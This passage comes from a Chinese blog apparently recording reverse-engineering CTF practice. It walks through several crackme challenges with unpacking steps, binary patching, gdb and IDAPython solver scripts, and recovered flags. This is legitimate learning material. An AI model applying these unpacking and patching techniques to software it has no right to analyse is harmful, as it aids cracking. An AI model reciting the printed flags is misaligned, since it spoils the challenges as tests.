src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200515135919513-1591166487828.png" alt="image-20200515135919513"></p><p><strong>总结: (1）算法好的话, 这道题就轻松很多。(2)注意64位程序的传递参数的方式。</strong></p><h3 id="easyre-153"><a href="#easyre-153" class="headerlink" title="easyre-153"></a>easyre-153</h3><blockquote><p>题其实很简单,  能猜到flag怎么算出来, 但对程序的执行想不明白，花了些时间。</p></blockquote><p>32位elf文件加了upx壳, 没有修改过的, 直接upx -d脱壳成功.<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200515184107394-1591167002031.png" alt="image-20200515184107394"></p><p>ida打开, 找到主函数. 一开始就认为直接动跳控制函数的走向, 到最后一个 <strong>lol</strong> 函数得到flag. 但是动态总是在read函数卡住, 走不了, 但这里我们并不能直接跳,因为这个函数是向<strong>buf</strong>写内容, 我们最后的flag是要使用buf的内容. 然后又转 GDB 调试, 同然的结果.    纳闷这题了, 它到底是要做什么. 其实猜也是把上面 write的那部分数据作为 buf 的内容, 然后在lol函数得到 flag.  但问题是 程序到底在搞什么…..</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200515185409497-1591167023660.png" alt="image-20200515185409497"></p><p>真的做到自闭, 后来才发现我忽略上面的 pipe()函数与fork()函数. 第一次见到, 百度了下, 明白了…</p><blockquote><p>首先是管道: 1.其本质是一个伪文件(实为内核缓冲区)</p><p>​                     2.由两个文件描述符引用，一个表示读端，一个表示写端。</p><p>​                     3.规定数据从管道的写端流入管道，从读端流出</p><p>pipe()函数用于创建管道: 1.int pipe(int pipefd[2]); 成功：0；失败：-1，设置errno</p><p>​                                           2.函数调用成功返回r/w两个文件描述符。无需open，但需手动close</p><p>​                                           3.规定：fd[0] → r； fd[1] → w，就像0对应标准输入，1对应标准输出一样。</p><p>​                                           4.向管道文件读写数据其实是在读写内核缓冲区</p><p><strong>这里就是通过pipedes[1]写进内容,  从pipedes[0]写出.</strong>                    </p></blockquote><blockquote><p>然后fork()函数. 1.fork（）函数通过系统调用创建一个与原来进程几乎完全相同的进程，</p><p>​                            也就是两个进程可以做完全相同的事，但如果初始参数或者传入的变量不同，两个进程                            也可以做不同的事</p><p>​                           2.一个进程调用fork（）函数后，系统先给新的进程分配资源，例如存储数据和代码的空                           间。然后把原来的进程的所有值都复制到新的新进程中，只有少数值与原来的进程值                           不同。相当于克隆了一个自己</p><p>​                           3.调用fork函数一次, 返回2次值, 若返回0则是子进程, 若是一个数则是父进程的进程号.</p><p><strong>所以这里就是先创建一个子进程,返回值v5 == 0, 进入子进程完成写入数据后结束进程, fork()返回新的值父进程进程号,然后执行后面的操作.</strong>        </p></blockquote><p>这里动态调试这种创建进程的程序是不通畅的. 那就通过修改程序 EIP, 按照本来要执行的顺序执行一遍得到flag.(注意这样可能会有一个问题: 栈不平衡, 因为函数没有正常返回, 那会影响一些函数, 比如scanf()函数执行到了, 不会让我们输入, 而是直接跳过, 这就是堆栈有值它就直接读取了)</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200515193103677-1591167041257.png" alt="image-20200515193103677"></p><p><strong>总结:(1)对于盲区的知识, 搞起来还是麻烦，积累吧。 (2)熟悉了修改 EIP。</strong> </p><h3 id="76号公路"><a href="#76号公路" class="headerlink" title="76号公路"></a>76号公路</h3><p>题目看似很难的样子, 但自己确实被题目的信息误导了.</p><p>下载后, 2个文本一个32位无壳elf文件, 并且题目信息就给了 <strong>我们认为有份确切的文档记录了每个区域的功能，请协助找出</strong> 这个提示, 所以自己做题时始终想到怎么和文本联系起来, 找线索. 但其实不然</p><p>载入ida后, 搜索了下字符串, 找到了主函数, 但是不能转化为伪代码,  因为之前了解过点花指令,其中  <strong>E0</strong> 总是干扰代码的. 改为 <strong>90</strong> nop掉就可以了. </p><p>这里同样. 改完后, 开始读汇编代码, 逻辑很简单, 就是提示, 让我们输入字符, 进去一个函数判断.<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200521123259003-1591167068213.png" alt="image-20200521123259003"></p><p>进去判断函数, 可以查看伪代码的. 分析一下就知道是跟着一条线按照顺序检索我们输入的字符串. 但是怎么找顺序呢, 因为文本文件还没用, 我就始终认为在文本文件找, 找了半天…….无果</p><p>最后回到程序发现, 可以找到入口点, 顺藤摸瓜的就可以找到了啊. 可以知道从索引 <strong>v2</strong> 从0开始, 直接从这里出发就好了. 直到正确退出循环.<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200521123808376-1591167075180.png" alt="image-20200521123808376"></p><p>最后得到flag: <strong>flag{09vdf7wefijbk}</strong>.</p><p><strong>总结: (1)不要让题目把自己的思路带偏了, 思维要发散一些.</strong>  </p><h3 id="reverse-box"><a href="#reverse-box" class="headerlink" title="reverse-box"></a>reverse-box</h3><p>题目下载下来，弄半天始终觉得有问题。百度发现题目少给了输出字符串。</p><p>开始再次看题，被自己坑惨了。。。因为生成数据表的函数中自己只看到了生成的随机数赋值了给了数据表的第一次元素，那整个题就有点奇怪了。看了又看，才发先最后用到了随机数生成数据的，只是屏幕容不下了。。。</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200528115958609-1591167079725.png" alt="image-20200528115958609"></p><p>另外就是先将每次生成索引值 v7 用C语言写出来后打印看看， 但大多数是负数，很大的数。这显然不对的，因为我们运行程序时输入的参数都是可打印字符 （ASCII: 32-127），伪代码不靠谱，果断去看看了汇编。</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200528121109201-1591167091052.png" alt="image-20200528121109201"></p><p>另外就是 伪代码中的 __ROR__了，看了汇编知道了 ror 指令，将数据想右位移动指定的位数。以为只是简单的  &gt;&gt; ，就这样写了整个题的爆破代码。但是始终不对，花了很时间，不甘心，就ida中动调，C语言中调试，每个步骤对比结果，才找到是 ror 这里错了。。。 原来 ror 是右移动位后会把多余的位移动到最左边，即一个圆圈转，这是循环移位。</p><p>exp: </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">generate</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> *result)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> v7 = <span class="number">1</span>, v2 = <span class="number">0</span>, v3 = <span class="number">0</span>, temp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> v4 = <span class="number">0</span>, v5 = <span class="number">0</span>, v8 = <span class="number">1</span>, v9 = <span class="number">0</span>;</span><br><span class="line">result[<span class="number">0</span>] = a;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v2 = v7 ^ <span class="number">2</span> * v7;</span><br><span class="line"><span class="keyword">if</span>((v7 &amp; <span class="number">0x80</span>) == <span class="number">0</span>)</span><br><span class="line">v3 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">v3 = <span class="number">27</span>;</span><br><span class="line">        </span><br><span class="line">v7 = v2 ^ v3;</span><br><span class="line">v7 = v7 &amp; <span class="number">0xFF</span>; </span><br><span class="line">        v4 = (<span class="number">4</span> * (<span class="number">2</span> * v8 ^ v8) ^ <span class="number">2</span> * v8 ^ v8)&amp;<span class="number">0xff</span>;</span><br><span class="line">        v9 = ((<span class="number">16</span> * v4 ^ v4)&amp;<span class="number">0xff</span>);</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> ( v9 &gt;= <span class="number">0</span> &amp;&amp; v9 &lt;= <span class="number">127</span> )</span><br><span class="line">      v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v5 = <span class="number">9</span>;</span><br><span class="line">    v8 = (v9 ^ v5);</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span>(v7 &lt; <span class="number">127</span>)</span><br><span class="line">    result[v7] = (((v8 &gt;&gt; <span class="number">4</span>) | ((v8 &amp; <span class="number">0xF</span>) &lt;&lt; <span class="number">4</span>)) ^ ((v8 &gt;&gt; <span class="number">5</span>) | ((v8&amp;<span class="number">0x1F</span>) &lt;&lt; <span class="number">3</span>)) ^ ((v8 &gt;&gt; <span class="number">6</span>) | ((v8&amp;<span class="number">0x3F</span>)&lt;&lt;<span class="number">2</span>) ) ^ ((v8 &gt;&gt; <span class="number">7</span>) | ((v8&amp;<span class="number">0xFF</span>)&lt;&lt;<span class="number">1</span>) ) ^ (v8 ^ a))&amp;<span class="number">0xff</span>;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">while</span>(v7 != <span class="number">1</span>); </span><br><span class="line">&#125;</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> *result = (<span class="keyword">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*<span class="number">127</span>);</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, value = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> a[] = <span class="string">"95eeaf95ef94234999582f722f492f72b19a7aaf72e6e776b57aee722fe77ab5ad9aaeb156729676ae7a236d99b1df4a"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">generate(i, result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(result[<span class="number">84</span>] == <span class="number">0x95</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a); i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(a[i] &gt;= <span class="number">48</span> &amp;&amp; a[i] &lt;= <span class="number">57</span>)</span><br><span class="line">a[i] -= <span class="number">48</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">a[i] -= <span class="number">87</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(a[i+<span class="number">1</span>] &gt;= <span class="number">48</span> &amp;&amp; a[i+<span class="number">1</span>] &lt;= <span class="number">57</span>)</span><br><span class="line">a[i+<span class="number">1</span>] -= <span class="number">48</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">a[i+<span class="number">1</span>] -= <span class="number">87</span>;</span><br><span class="line"></span><br><span class="line">value = a[i+<span class="number">1</span>] | a[i]*<span class="number">16</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">32</span>; j &lt; <span class="number">127</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(result[j] == value)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, j);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200528122051072-1591167097050.png" alt="image-20200528122051072"></p><p>做完去看了看网上的 writeup， 发现都是用gdb写脚本搞的，然后去学习了下。</p><p>使用 gdb的 define 命令可以定义一系列的gdb指令。首先找到要下断点地址，这个在ida中很容易。</p><p>这里有2中方法，执行gdb脚本，一：直接输入define命令，输入指令，最后执行。二：单独写成一个脚本文件使用 source 来执行。</p><p>这里直接写的脚本文件使用 source执行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">set $i = <span class="number">0</span></span><br><span class="line">set $total = <span class="number">256</span></span><br><span class="line"><span class="keyword">while</span>($i &lt; $total)</span><br><span class="line">  b *<span class="number">0x80485b4</span></span><br><span class="line">  b *<span class="number">0x8048707</span></span><br><span class="line">  run T</span><br><span class="line">  set $i = $i+<span class="number">1</span></span><br><span class="line">  set *(char*)($ebp<span class="number">-0xc</span>) = $i</span><br><span class="line">  <span class="keyword">continue</span></span><br><span class="line">  <span class="keyword">if</span> ($eax == <span class="number">0x95</span>)</span><br><span class="line">    <span class="keyword">print</span> $i</span><br><span class="line">    x/<span class="number">127</span>xb $esp+<span class="number">0x1c</span></span><br><span class="line">    set $i = <span class="number">256</span></span><br><span class="line">  stop</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200528163112618-1591167101638.png" alt="image-20200528163112618"></p><p>因为可打印字符的ASCII：32-127，所以我们打印出前128个数据即可。最后解密。python确实方便，各种方法直接调用即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">list =  [<span class="number">0xd6</span>,<span class="number">0xc9</span>,<span class="number">0xc2</span>,<span class="number">0xce</span>,<span class="number">0x47</span>,<span class="number">0xde</span>,<span class="number">0xda</span>,<span class="number">0x70</span></span><br><span class="line">,<span class="number">0x85</span>,<span class="number">0xb4</span>,<span class="number">0xd2</span>,<span class="number">0x9e</span>,<span class="number">0x4b</span>,<span class="number">0x62</span>,<span class="number">0x1e</span>,<span class="number">0xc3</span></span><br><span class="line">,<span class="number">0x7f</span>,<span class="number">0x37</span>,<span class="number">0x7c</span>,<span class="number">0xc8</span>,<span class="number">0x4f</span>,<span class="number">0xec</span>,<span class="number">0xf2</span>,<span class="number">0x45</span></span><br><span class="line">,<span class="number">0x18</span>,<span class="number">0x61</span>,<span class="number">0x17</span>,<span class="number">0x1a</span>,<span class="number">0x29</span>,<span class="number">0x11</span>,<span class="number">0xc7</span>,<span class="number">0x75</span></span><br><span class="line">,<span class="number">0x02</span>,<span class="number">0x48</span>,<span class="number">0x26</span>,<span class="number">0x93</span>,<span class="number">0x83</span>,<span class="number">0x8a</span>,<span class="number">0x42</span>,<span class="number">0x79</span></span><br><span class="line">,<span class="number">0x81</span>,<span class="number">0x10</span>,<span class="number">0x50</span>,<span class="number">0x44</span>,<span class="number">0xc4</span>,<span class="number">0x6d</span>,<span class="number">0x84</span>,<span class="number">0xa0</span></span><br><span class="line">,<span class="number">0xb1</span>,<span class="number">0x72</span>,<span class="number">0x96</span>,<span class="number">0x76</span>,<span class="number">0xad</span>,<span class="number">0x23</span>,<span class="number">0xb0</span>,<span class="number">0x2f</span></span><br><span class="line">,<span class="number">0xb2</span>,<span class="number">0xa7</span>,<span class="number">0x35</span>,<span class="number">0x57</span>,<span class="number">0x5e</span>,<span class="number">0x92</span>,<span class="number">0x07</span>,<span class="number">0xc0</span></span><br><span class="line">,<span class="number">0xbc</span>,<span class="number">0x36</span>,<span class="number">0x99</span>,<span class="number">0xaf</span>,<span class="number">0xae</span>,<span class="number">0xdb</span>,<span class="number">0xef</span>,<span class="number">0x15</span></span><br><span class="line">,<span class="number">0xe7</span>,<span class="number">0x8e</span>,<span class="number">0x63</span>,<span class="number">0x06</span>,<span class="number">0x9c</span>,<span class="number">0x56</span>,<span class="number">0x9a</span>,<span class="number">0x31</span></span><br><span class="line">,<span class="number">0xe6</span>,<span class="number">0x64</span>,<span class="number">0xb5</span>,<span class="number">0x58</span>,<span class="number">0x95</span>,<span class="number">0x49</span>,<span class="number">0x04</span>,<span class="number">0xee</span></span><br><span class="line">,<span class="number">0xdf</span>,<span class="number">0x7e</span>,<span class="number">0x0b</span>,<span class="number">0x8c</span>,<span class="number">0xff</span>,<span class="number">0xf9</span>,<span class="number">0xed</span>,<span class="number">0x7a</span></span><br><span class="line">,<span class="number">0x65</span>,<span class="number">0x5a</span>,<span class="number">0x1f</span>,<span class="number">0x4e</span>,<span class="number">0xf6</span>,<span class="number">0xf8</span>,<span class="number">0x86</span>,<span class="number">0x30</span></span><br><span class="line">,<span class="number">0xf0</span>,<span class="number">0x4c</span>,<span class="number">0xb7</span>,<span class="number">0xca</span>,<span class="number">0xe5</span>,<span class="number">0x89</span>,<span class="number">0x2a</span>,<span class="number">0x1d</span></span><br><span class="line">,<span class="number">0xe4</span>,<span class="number">0x16</span>,<span class="number">0xf5</span>,<span class="number">0x3a</span>,<span class="number">0x27</span>,<span class="number">0x28</span>,<span class="number">0x8d</span>,<span class="number">0x40</span></span><br><span class="line">,<span class="number">0x09</span>,<span class="number">0x03</span>,<span class="number">0x6f</span>,<span class="number">0x94</span>,<span class="number">0xa5</span>,<span class="number">0x4a</span>,<span class="number">0x46</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line">s = <span class="string">"95eeaf95ef94234999582f722f492f72b19a7aaf72e6e776b57aee722fe77ab5ad9aaeb156729676ae7a236d99b1df4a"</span>;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(s), <span class="number">2</span>):</span><br><span class="line">    s1 = int(s[i:i+<span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line">    flag += chr(list.index(s1))</span><br><span class="line"><span class="keyword">print</span> (flag)</span><br></pre></td></tr></table></figure><p><strong>总结：这道题收获还是很大。1：对ida中汇编语言的解读更熟悉了些，注意各种 al 取最低字节数据。 2：ror指令的了解，及对他的C语言用法：如 <code>ror a，3</code> 那C语言为：<code>((a&gt;&gt;3）| ((a&amp;7) &lt;&lt; 5))</code>。 3：使用gdb写脚本。</strong></p><blockquote><p><strong>gdb脚本中的 查看内存内容的方法：x/&lt;n/f/u&gt; <addr>     n、f、u是可选的参数。</addr></strong></p><p><strong>n：显示的内存单元的个数，f：表示显示的格式，其中：s：字符串显示，x：按十六进制格式显示，d：按十进制格式显示变量</strong></p><p><strong>u：按十六进制格式显示无符号整型，t：按二进制格式显示， o：按八进制格式显示，c：按字符格式显示变量。</strong></p><p><strong>最后的u表示每个单元的大小，其中：b表示单字节，h表示双字节，w表示四字 节，g表示八字节。</strong></p><p><strong>那上面脚本写的 x/127xb  表示将 127个的单字节单元的数据按16进制格式显示出来。</strong></p></blockquote><h3 id="What-does-this-button-do"><a href="#What-does-this-button-do" class="headerlink" title="What-does-this-button-do"></a>What-does-this-button-do</h3><blockquote><p>很简单的一道安卓逆向，为什么分数那么高。。。</p></blockquote><p>下载解压后得到一堆文件，对安卓逆向没深入了解过，直接找到 .dex文件，使用强大的 ApkToolkit 工具转 .dex文件为 .jar文件。</p><p>接着就是使用 jd-gui 打开，看反编译的java代码。</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200530123951599-1591167111011.png" alt="image-20200530123951599"></p><p>看 FlagActivity.class，就是直接取出flag。</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200530124201413-1591167113886.png" alt="image-20200530124201413"></p><p>打印出来就好了。flag: <strong>flag{w4nn4_j4r_my_d3x}</strong></p><p><strong>总结：安卓逆向也是遇到一道，然后做来试试看，但也只能做很简单的，暂时熟悉工具吧。</strong></p><h3 id="re5-packed-movement"><a href="#re5-packed-movement" class="headerlink" title="re5-packed-movement"></a>re5-packed-movement</h3><blockquote><p>对于全是mov指令，这道题看了writeup做的，学习了ida中脚本的使用。</p></blockquote><p>32位elf文件加了upx壳，直接使用 upx -d。</p><p>打开全是mov指令，心想这又是什么骚操作，一波操作后还是不会。后面发现都是用ida脚本实现，那其实也可以用gdb脚本。</p><p>学习一番ida脚本及idc的语法，开始做题。先找到代码段地址，因为考虑flag是通过立即数mov指令赋值的。</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200602151634347.png" alt="image-20200602151634347"></p><p>写脚本搜索四个字节的所有可打印字符。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">start=<span class="number">0x0804829C</span></span><br><span class="line">end=<span class="number">0x08060B3A</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">while</span> start&lt;end:</span><br><span class="line">    <span class="keyword">if</span> (Byte(start) &lt;= ord(<span class="string">'9'</span>) <span class="keyword">and</span> Byte(start)&gt;=ord(<span class="string">'0'</span>)) <span class="keyword">or</span> (Byte(start)&lt;=ord(<span class="string">'z'</span>) <span class="keyword">and</span>                 Byte(start)&gt;=ord(<span class="string">'a'</span>)) <span class="keyword">or</span> (Byte(start)&lt;=ord(<span class="string">'Z'</span>) <span class="keyword">and</span> Byte(start)&gt;=ord(<span class="string">'A'</span>)) <span class="keyword">or</span> </span><br><span class="line">      (Byte(start) == ord(<span class="string">'&#125;'</span>)) <span class="keyword">or</span> (Byte(start) == ord(<span class="string">'&#123;'</span>)) <span class="keyword">or</span> (Byte(start) == ord(<span class="string">'_'</span>)) <span class="keyword">or</span> </span><br><span class="line">      (Byte(start) == ord(<span class="string">'@'</span>)) <span class="keyword">or</span> (Byte(start) == ord(<span class="string">'!'</span>)) <span class="keyword">or</span> (Byte(start) == ord(<span class="string">'#'</span>)) <span class="keyword">or</span>     (Byte(start) == ord(<span class="string">'&amp;'</span>)) <span class="keyword">or</span> (Byte(start) == ord(<span class="string">'*'</span>)):</span><br><span class="line">        <span class="keyword">if</span> Byte(start) <span class="keyword">and</span> (Byte(start+<span class="number">1</span>)==<span class="number">0</span>) <span class="keyword">and</span> (Byte(start+<span class="number">2</span>)==<span class="number">0</span>) <span class="keyword">and</span> (Byte(start+<span class="number">3</span>)==<span class="number">0</span>):</span><br><span class="line">            print(chr(Byte(start)))</span><br><span class="line">            flag += chr(Byte(start))</span><br><span class="line">    start += <span class="number">1</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>执行。</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200602154318790.png" alt="image-20200602154318790"></p><p><strong>总结：对ida脚本进行了学习，开始对ida执行脚本有所了解。</strong></p><h3 id="梅津美治郎"><a href="#梅津美治郎" class="headerlink" title="梅津美治郎"></a>梅津美治郎</h3><p>很简单一个题目，关键就是一点，使用了函数AddVectoredExceptionHandler（）。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PVOID <span class="title">AddVectoredExceptionHandler</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  ULONG                       First,</span></span></span><br><span class="line"><span class="function"><span class="params">  PVECTORED_EXCEPTION_HANDLER Handler <span class="comment">//要注册的异常处理程序。</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p>查看官方文档可知，此函数作用：<strong>注册一个异常处理程序</strong>。即当我们的程序中出现异常后会执行的函数。</p><p>程序在此处触发异常：<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200919201636653.png" alt="image-20200919201636653"></p><h3 id="easy-go"><a href="#easy-go" class="headerlink" title="easy_go"></a>easy_go</h3><p>go语言写的程序，谷歌了下去除符号表golang编译的程序的处理方法。</p><p>可以使用一个脚本<a href="https://github.com/sibears/IDAGolangHelper.git" target="_blank" rel="noopener">IDAGolangHelper</a>来还原符号表，那将极大方便我们分析程序。</p><p>但是ida7.0因为版本低的原因，使用这个脚本会有问题。然后找到解决办法：<a href="https://blog.csdn.net/qq_21063873/article/details/104335240" target="_blank" rel="noopener">https://blog.csdn.net/qq_21063873/article/details/104335240</a></p><p>成功还原符号表后，找到main_main函数，主逻辑还是能清楚，但细节的地方真的难看。。</p><p>发现base64相关的函数：<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200924200352664.png" alt="image-20200924200352664"></p><p>然后动调想看看自己输入的字符串存放在哪里也找不到。。。但是动调出了2个字符串，其中一个正好是64位，考虑是变异的base64加密，另一个字符串是输入flag的密文。</p><p>写脚本尝试解：还真的得到flag。。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">base1 = <span class="string">'6789_-abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345'</span></span><br><span class="line">t = <span class="string">'tGRBtXMZgD6ZhalBtCUTgWgZfnkTgqoNsnAVsmUYsGtCt9pEtDEYsql3'</span></span><br><span class="line">base = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line">ans = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> t:</span><br><span class="line">ans += base[base1.index(i)]</span><br><span class="line">print(ans)</span><br><span class="line">print(base64.b64decode(ans))</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;92094daf-33c9-431e-a85a-8bfbd5df98ad&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>leetcode</title>
      <link href="/2020/03/14/leetcode/"/>
      <url>/2020/03/14/leetcode/</url>
      
